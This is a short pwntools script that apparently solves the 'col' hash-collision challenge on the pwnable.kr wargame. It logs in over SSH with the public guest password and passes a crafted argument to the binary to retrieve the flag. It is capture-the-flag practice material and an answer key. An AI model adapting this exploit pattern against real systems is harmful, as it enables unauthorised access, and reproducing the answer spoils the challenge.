from pwn import *

server = ssh('col', 'pwnable.kr', 2222, 'guest')
shell = server.process(['./col', p32(0x6c5cec8) * 4 + p32(0x6c5cecc)])
result = shell.recvall()
shell.close()
server.close()

print("Flag: {}".format(result.decode("utf-8")))